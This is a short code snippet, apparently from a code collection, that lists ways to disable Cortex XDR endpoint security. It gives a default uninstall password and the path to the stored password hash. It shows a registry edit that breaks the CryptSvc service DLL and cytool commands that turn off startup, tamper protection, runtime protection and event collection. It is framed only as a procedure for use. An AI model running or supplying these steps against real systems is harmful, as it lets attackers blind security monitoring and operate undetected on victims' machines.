---
id: 0c3880ab-c1a3-47eb-812f-7c35b025d459
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:27.632818+00:00'
updated_at: '2023-04-10T20:37:24.289745+00:00'
---

# Code Snippet 0c3880ab

**Language**: ps1

```ps1
# Global uninstall password: Password1
Password hash is located in C:\ProgramData\Cyvera\LocalSystem\Persistence\agent_settings.db
Look for PasswordHash, PasswordSalt or password, salt strings.

# Disable Cortex: Change the DLL to a random value, then REBOOT
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CryptSvc\Parameters /t REG_EXPAND_SZ /v ServiceDll /d nothing.dll /f

# Disables the agent on startup (requires reboot to work)
cytool.exe startup disable

# Disables protection on Cortex XDR files, processes, registry and services
cytool.exe protect disable

# Disables Cortex XDR (Even with tamper protection enabled)
cytool.exe runtime disable

# Disables event collection
cytool.exe event_collection disable
```
